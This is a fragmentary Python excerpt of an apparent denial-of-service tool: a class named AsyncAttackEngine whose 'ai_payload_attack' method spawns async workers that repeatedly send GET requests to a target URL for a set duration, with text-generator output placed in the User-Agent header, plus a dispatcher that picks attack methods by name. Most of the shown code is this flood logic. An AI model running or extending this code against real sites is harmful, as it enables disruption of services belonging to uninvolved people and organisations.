import asyncio, aiohttp, socket, random, time, struct, dns.resolver, json, os
...
class AsyncAttackEngine:
    ...
    async def ai_payload_attack(self, target_url, duration):
        ...
        async def worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    payload = generator("GET / HTTP/1.1\r\nHost: ", max_length=50)[0]['generated_text']
                    try:
                        async with session.get(target_url, headers={'User-Agent': payload}) as resp:
                            await resp.read()
                    except: pass
    ...
    async def run_attack(self, method, target, port=80, duration=60, **kwargs):
        ...
        try:
            ...
            }.get(method, lambda: log(f"Unknown method {method}"))()
        finally:
            stats.active_attacks -= 1
